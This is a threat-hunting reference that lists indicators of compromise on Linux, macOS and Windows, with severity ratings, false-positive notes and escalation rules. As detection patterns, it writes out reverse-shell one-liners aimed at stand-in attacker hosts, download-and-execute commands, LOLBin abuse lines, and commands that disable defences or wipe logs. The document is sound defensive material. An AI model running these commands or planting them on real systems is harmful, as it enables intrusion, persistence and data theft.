# IOC Patterns Reference

> Analyze command output during hunt. Patterns distinguish malicious from benign. Match = flag at severity indicated.

---

## Universal Red Flags (All OSes)

Suspicious regardless of OS:

### Executables in Temp/World-Writable Dirs
**Severity:** Critical  
**Pattern:** Executable binary (`.exe`, `.dll`, `.so`, `.dylib`, compiled ELF) running from or staged in:
- Linux/macOS: `/tmp/`, `/var/tmp/`, `/dev/shm/`, `/run/user/*/`
- Windows: `%TEMP%`, `%APPDATA%`, `%LOCALAPPDATA%`, `C:\Users\*\Downloads\`

**Why malicious:** Legit software runs from stable managed locations (`/usr/bin`, `C:\Program Files`, `/Applications`). Malware drops to writable locations - can't write to system dirs.

**False+:** Very low. Exceptions: some updaters use temp as brief staging, pkg managers during install.

---

### Processes with Deleted/Unlinked Executables
**Severity:** Critical  
**Pattern:** `lsof +L1` hit, OR `/proc/*/exe -> ... (deleted)`, OR process with no binary on disk.

**Why malicious:** Malware drops binary, executes, then deletes to:
1. Prevent AV scanning
2. Hinder forensic recovery
3. Hide binary existence

Near-universal indicator - legit software almost never deletes own executable while running.

**False+:** Extremely low on macOS/Linux. Rare: some auto-updaters briefly during transition.

---

### Unsigned or Self-Signed Binaries in Unexpected Locations
**Severity:** High  
**Pattern:**
- macOS: `codesign -dv` returns "code object is not signed" or "CSSMERR_TP_NOT_TRUSTED"
- Windows: `Get-AuthenticodeSignature` returns `NotSigned` or `HashMismatch`
- Linux: Check pkg mgr: `rpm -qf <binary>` or `dpkg -S <binary>` - not in any package = flag

**Why malicious:** Legit commercial/system software is signed. Malware typically unsigned (no trusted CA certs) or self-signed.

**False+:** Medium. Homebrew, custom scripts, dev tools often unsigned. Context matters - `/usr/local/bin` ≠ `/tmp`.

**Escalate when:** Unsigned binary in persistence location, running as service/daemon, or has network connections.

---

### Outbound Connections from Unusual Processes
**Severity:** High  
**Pattern:** Network connection from:
- `bash`, `sh`, `zsh` - shell making direct connection
- `python`, `perl`, `ruby`, `php` with external connection
- `cmd.exe`, `powershell.exe` with external (not to update servers)
- System utilities (`ls`, `ps`, `cat`, `grep`) - NEVER should have network connections

**Why malicious:** Reverse shell or C2 beacon. Legit orchestration uses runtimes with network access but tied to known scripts/tasks, not interactive launch.

**False+:** Medium for scripting langs (legit automation). Very Low for shells and system utilities.

---

### RFC1918 Connections on Non-Standard Ports
**Severity:** Medium-High  
**Pattern:** TCP connections to `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` on non-standard ports (not 22/80/443/3306/5432/8080/etc.).

**Why malicious:** Lateral movement indicator. Post-compromise, attackers move to other internal systems using non-standard ports for C2/staging.

**False+:** Medium. Many legit apps use non-standard internal ports.

---

### DNS Queries to DGA-Like or Unusual Domains
**Severity:** High  
**Pattern:**
- 10+ random-looking chars (entropy DGA): `asdkfjqwe.top`, `xn--234kl.cc`
- Unusual TLDs: `.top`, `.xyz`, `.tk`, `.pw`, `.cc`, `.ml`, `.ga`, `.cf` - free, commonly abused
- Domains registered < 30 days ago (check WHOIS)
- Long encoded subdomains (DNS C2): `b64encodeddata.legit-looking-domain.com`

**False+:** Medium - legit services use unusual TLDs. Context + registration recency matter.

---

### Cron/Scheduled Tasks with Download-and-Execute
**Severity:** Critical  
**Pattern:**
```
# These patterns in cron, scheduled tasks, or startup scripts:
curl http[s]://... | bash
curl http[s]://... | sh  
wget -O- http[s]://... | bash
wget -q http[s]://... -O /tmp/x && chmod +x /tmp/x && /tmp/x
python -c "import urllib; exec(urllib.urlopen('http://...').read())"
powershell -enc <base64> 
IEX(New-Object Net.WebClient).DownloadString('http://...')
```

**Why malicious:** Classic malware installer/updater. Legit update mechanisms use signed packages, not download-and-execute.

**False+:** Low. Some legacy DevOps pulls configs via curl/wget, but not piped to shell.

---

### New User Accounts or Recently Changed Passwords
**Severity:** Medium-High  
**Pattern:**
- User account created, no IT ticket or change record
- Privileged account (root, Administrator) password changed at unusual hours
- New account immediately added to privileged groups

**False+:** Medium - depends on org change management. Always verify against expected changes.

---

### SSH Authorized Keys with Unexpected Entries
**Severity:** High  
**Pattern:** `~/.ssh/authorized_keys` has unrecognized keys, or keys with:
- `command="bash -i"` - every SSH auth runs shell
- No `from=""` restriction on server
- Multiple keys where only one expected

**False+:** Low. Unexpected SSH keys almost always worth investigating.

---

### Shell History Showing Attack Patterns
**Severity:** Varies by pattern  
**Patterns and severity:**

| Pattern | Severity | Notes |
|---------|----------|-------|
| `curl \| bash` or `wget \| sh` | Critical | Download and execute |
| `echo "<base64>" \| base64 -d \| bash` | Critical | Encoded payload execution |
| `python -c "import socket..."` | Critical | Classic Python reverse shell |
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | Critical | Bash TCP reverse shell |
| `nc -e /bin/bash IP PORT` | Critical | Netcat reverse shell |
| `chmod +x /tmp/...` | High | Making dropped binary executable |
| `codesign --remove-signature` | High | macOS Gatekeeper bypass |
| `xattr -d com.apple.quarantine` | High | macOS quarantine removal |
| `Set-MpPreference -DisableRealtime` | Critical | Windows Defender disable |
| `setenforce 0` | High | Linux SELinux disable |
| `iptables -F` | High | Linux firewall flush |
| `history -c` or `> ~/.bash_history` | High | Covering tracks |
| `rm -rf /var/log/` | Critical | Log destruction |
| `last -d -c` | Medium | Clearing login history |

---

### Security Tools Not Running
**Severity:** High  
**Pattern:** EDR/AV installed but not running:
- Agent process dir exists but not in `ps`
- Service registered but status = `stopped`
- Config files present but binary missing

**False+:** Low. Tools can crash or be disabled by IT, but managed endpoints should auto-recover.

---

## macOS-Specific IOCs

### LaunchAgent/LaunchDaemon Pointing to Non-App Paths
**Severity:** Critical  
**Pattern:**
```xml
<key>ProgramArguments</key>
<array>
    <string>/bin/bash</string>
    <string>-c</string>
    <string>/Users/user/Library/caches/update.sh</string>  <!-- Red flag -->
</array>
```

**Legitimate paths look like:**
```xml
<string>/Applications/AppName.app/Contents/MacOS/AppName</string>
<string>/usr/local/bin/known-tool</string>
```

**Red flag paths:**
- `~/Library/` (outside known `.app` bundle)
- `/tmp/`, `/var/folders/`
- `~/Downloads/`, `~/Desktop/`
- Any path with `.sh`, `.py`, `.rb` (script execution via LaunchAgent = unusual)

---

### Quarantine Attribute Removed
**Severity:** Medium-High  
**Pattern:** `xattr -l <file>` shows NO `com.apple.quarantine` on supposedly-downloaded file.

**Why malicious:** macOS adds quarantine xattr to downloaded files. Removing it bypasses Gatekeeper first-run check. Attackers use `xattr -d com.apple.quarantine` to run unsigned/malicious apps without warning.

**False+:** Medium - some devs strip quarantine from own tools, some pkg managers do. Context matters.

---

### osascript in History
**Severity:** Medium  
**Pattern:** `osascript -e '...'` in shell history, especially with:
- `do shell script "..."` - executes shell commands
- `display dialog` - social engineering UI
- `System Events` and `click` - UI automation for privilege prompting

**Why relevant:** AppleScript used in macOS malware for:
- Social engineering (fake dialogs asking for passwords)
- Shell commands from Apple-signed interpreter (bypass AV)
- Automating UI interactions (accepting permissions dialogs)

**False+:** Medium - devs and power users legitimately use osascript.

---

### Gatekeeper Disabled
**Severity:** High  
**Pattern:** `spctl --status` returns `assessments disabled`

**Why malicious:** Gatekeeper disabled = unsigned/unnotarized binaries run without warning. Sometimes done by attackers post-access to allow installing additional tools.

---

### TCC Privacy Grants to Unknown Apps
**Severity:** High  
**Pattern:** TCC DB shows grant for:
- `kTCCServiceCamera` - camera access
- `kTCCServiceMicrophone` - microphone access
- `kTCCServiceScreenCapture` - screen recording
- `kTCCServiceSystemPolicyAllFiles` - Full Disk Access
- `kTCCServiceAddressBook` - contacts
- `kTCCServiceCalendar` - calendar
...granted to app you don't recognize.

**False+:** Low for camera/mic/screen. Medium for FDA (some backup/AV tools need this).

---

### Processes Using task_for_pid (Injection Indicator)
**Severity:** High  
**Pattern:** Processes calling `task_for_pid` on another process's PID. Check:
```bash
sudo log show --predicate 'eventMessage contains "task_for_pid"' --last 4h --style compact
```

**Why malicious:** `task_for_pid` = macOS process injection - gives one process access to another's memory. Legit uses extremely limited (debuggers, Instruments).

---

## Linux-Specific IOCs

### Files in /dev/shm
**Severity:** Critical  
**Pattern:** ANY regular file (`-type f`) in `/dev/shm/`

**Why malicious:** `/dev/shm` = memory-backed tmpfs. Files exist only in RAM (not on disk after reboot). Malware uses to:
1. Avoid disk-based AV
2. Execute without touching persistent storage
3. Self-destruct on reboot

**False+:** Very low. Chrome/some DBs use shared memory segments but named after app and not executables.

---

### Executable Files in /tmp with SUID Bit
**Severity:** Critical  
**Pattern:** `find /tmp -perm -4000 -type f` returns results

**Why malicious:** SUID in `/tmp` = any user runs it as file owner. If root-owned: instant privilege escalation tool planted by attacker.

---

### .bashrc/.profile Containing Reverse Shell
**Severity:** Critical  
**Pattern:**
```bash
# These patterns in .bashrc, .bash_profile, .profile, /etc/profile.d/
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
python -c 'import socket,subprocess,os;...'
nc -e /bin/bash ATTACKER_IP PORT
ncat ATTACKER_IP PORT -e /bin/bash
/bin/bash -l > /dev/tcp/ATTACKER_IP/PORT 0<&1 2>&1
```

**Also flag (less obvious but suspicious):**
```bash
alias sudo='sudo nc -e /bin/bash attacker.com 4444 &'  # Credential harvesting
export PATH=/tmp:$PATH  # PATH hijacking
```

---

### Systemd Service with ExecStart in /tmp or /dev/shm
**Severity:** Critical  
**Pattern:**
```ini
[Service]
ExecStart=/tmp/update-service.sh
# or
ExecStart=/dev/shm/.hidden_service
```

**Why malicious:** Legit services install to `/usr/lib/systemd/system/` and run from `/usr/bin/`, `/usr/sbin/`, `/opt/vendor/`. Pointing to world-writable dirs = planted persistence.

---

### Kernel Module Not in Distribution
**Severity:** High  
**Pattern:** `lsmod` output shows modules not in:
- Distribution modules: `find /lib/modules/$(uname -r) -name "*.ko" | xargs basename -s .ko`
- Known security tool modules: `falco`, `sfc`, `elastic`, `elastic-agent`

**Flag:** Modules with legit-sounding names not in module directory, or loaded from custom paths in dmesg.

---

### eBPF Programs from Non-Security-Tool Processes
**Severity:** High  
**Pattern:** `bpftool prog list` shows programs loaded by processes other than:
- Known security tools (Falco, Datadog, Elastic, Cilium, Calico, Tetragon)
- System networking tools (`tc`, `ip`, `bpftrace` for legit debugging)

**Why malicious:** eBPF runs in kernel space with high privs. Attacker with root loading custom eBPF = intercept syscalls, hide network traffic, steal creds, hide processes - all from kernel space, no traditional kmod needed.

---

## Windows-Specific IOCs

### PowerShell Encoded Command
**Severity:** Critical  
**Pattern:**
```
powershell.exe -EncodedCommand <long base64 string>
powershell.exe -enc <long base64 string>
powershell.exe -e <long base64 string>
```

**Why malicious:** Base64-encoding PS commands = primary evasion against string matching + script block scanners. Rare legit use.

**Decode:** `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>'))`

**False+:** Low. Legit enterprise automation passes scripts as files, not encoded strings.

---

### LOLBin Abuse (Living Off the Land)
**Severity:** High  
**Pattern - These legitimate Windows binaries being used maliciously:**

| Binary | Malicious Usage Pattern | Notes |
|--------|------------------------|-------|
| `rundll32.exe` | `rundll32 \\live.sysinternals.com\...` or `rundll32 javascript:"...\..."` | Should only run local DLLs with known exports |
| `regsvr32.exe` | `regsvr32 /s /u /i:http://...` | "Squiblydoo" - bypasses AppLocker |
| `mshta.exe` | `mshta.exe http://...` | HTML Application from URL |
| `certutil.exe` | `certutil -decode b64file.txt output.exe` | Base64 decode to executable |
| `bitsadmin.exe` | `bitsadmin /transfer job http://...` | Download to disk |
| `wmic.exe` | `wmic process call create "powershell.exe -enc..."` | Process creation evasion |
| `msiexec.exe` | `msiexec /quiet /i http://...` | Remote MSI install |
| `odbcconf.exe` | `odbcconf /a {REGSVR \\attacker.com\...dll}` | DLL execution |

---

### WMI Event Subscription (Always Critical)
**Severity:** Critical  
**Pattern:** `Get-WmiObject -Namespace root\subscription` returns ANY binding with `__EventConsumer` executing code.

**Why malicious:** WMI subscriptions survive reboots, run silently with no visible process, invisible to standard persistence checks. High-sophistication APT technique.

**False+:** Near zero. Almost no legit commercial software uses WMI subscriptions. Known exceptions: some Microsoft backup/SCCM tools - identifiable by component names.

---

### Named Pipe Matches C2 Framework Defaults
**Severity:** Critical  
**Cobalt Strike default pipe names:**
- `\\.\pipe\msagent_*` (SMB beacon default)
- `\\.\pipe\MSSE-*-server` (process injection comms)
- `\\.\pipe\postex_*` (post-exploitation)
- `\\.\pipe\status_*`
- `\\.\pipe\isapi_http`
- `\\.\pipe\isapi_dg`
- `\\.\pipe\ntsvcs` (older Cobalt Strike)

**Other C2 framework defaults:**
- `\\.\pipe\mojo.*` - Chrome uses this legitimately; malware also uses it for mimicry
- `\\.\pipe\583da4ce*` - Cobalt Strike variant
- Any pipe with `gimmick` in the name - GIMMICK malware

**What to do:** Run process handle analysis to find which process owns the pipe:
```powershell
handle.exe -a -p <pid> | findstr pipe
# Or with Sysinternals:
pipelist.exe
```

---

### AppInit_DLLs Set (DLL Injection)
**Severity:** Critical  
**Pattern:**
```
HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs = "C:\path\to\evil.dll"
HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs = 1
```

**Why malicious:** `AppInit_DLLs` injects specified DLL into EVERY process loading `user32.dll` (essentially every GUI app). Code execution in every running process. Legit software essentially never uses this on modern Windows.

---

### BITS Job with Suspicious URL
**Severity:** High  
**Pattern:** BITS transfer job where `RemoteUrl` is:
- URL path looking like script or executable
- URL to dynamic DNS provider
- URL to cloud storage for unrecognizable file

**Why relevant:** BITS jobs run as background Windows service, survive reboots if suspended, use Windows Update infrastructure - appear less suspicious in network analysis.

---

## Ambiguous Indicators - Require Context

NOT automatic IOCs. Need context to assess:

### netcat (nc / ncat)
- **Legit:** Network testing, sysadmin connectivity checks, data transfer
- **Malicious:** `nc -e /bin/bash IP PORT` (reverse shell), `nc -lvp PORT` (listener)
- **Verdict:** Flag if found with `-e /bin/bash`, `-e cmd.exe`, or listening on unexpected ports

### python -c / perl -e / ruby -e
- **Legit:** Quick scripting, one-liners for data processing
- **Malicious:** Complex socket code, subprocess/os with shell=True, reverse shell payloads
- **Verdict:** Flag if one-liner contains `socket`, `subprocess`, `exec`, `/dev/tcp`, or network code

### Base64 in URLs or Arguments
- **Legit:** Many legit apps use base64 for data encoding (JWT, API params)
- **Malicious:** Encoded payloads in PowerShell `-enc`, encoded URLs in curl/wget
- **Verdict:** Flag if base64 in `-enc` arg to PowerShell, or decodes to shellcode/script

### Outbound Connections on Port 443 to Cloud Providers
- **Legit:** Vast majority of HTTPS is legit
- **Malicious:** Domain fronting, C2 over HTTPS to Azure/AWS/Cloudflare-hosted C2
- **Verdict:** Flag ONLY when process is unusual (`bash`, `python`, `cmd.exe`). Normal browser/app HTTPS = not IOC.

### Python/Ruby/Node Interpreters Running
- **Legit:** Devs run these constantly; some system tools use them
- **Malicious:** Running from temp dirs, with network connections, as daemons
- **Verdict:** Check the script being executed, not just the interpreter

### sshd Port Forwarding
- **Legit:** Remote tunneling for sysadmin
- **Malicious:** Port forwarding to expose internal services to external attackers
- **Verdict:** Check `sshd_config` for `AllowTcpForwarding yes` (flag if unexpected), check for active tunnels in `ss`

---

## Severity Escalation Rules

Multiple indicators together → escalate severity:

1. **Process in /tmp** (High) + **network connection** (High) + **deleted binary** (Critical) = **CRITICAL - likely active compromise**

2. **LaunchAgent with script path** (High) + **script contains curl|bash** (Critical) = **CRITICAL - active persistence**

3. **New user account** (Medium) + **added to sudo group** (High) + **created outside business hours** (Low-Medium) = **HIGH - unauthorized account creation**

4. **WMI subscription** (Critical) + **PS history with encoded commands** (Critical) = **CRITICAL - APT-level persistence**

5. **EDR not running** (High) + **any other finding** = **Escalate all findings one level** - attacker may have disabled defenses first

6. **Log files cleared** (High) + **any other finding** = **Escalate** - attacker covering tracks, aware of detection
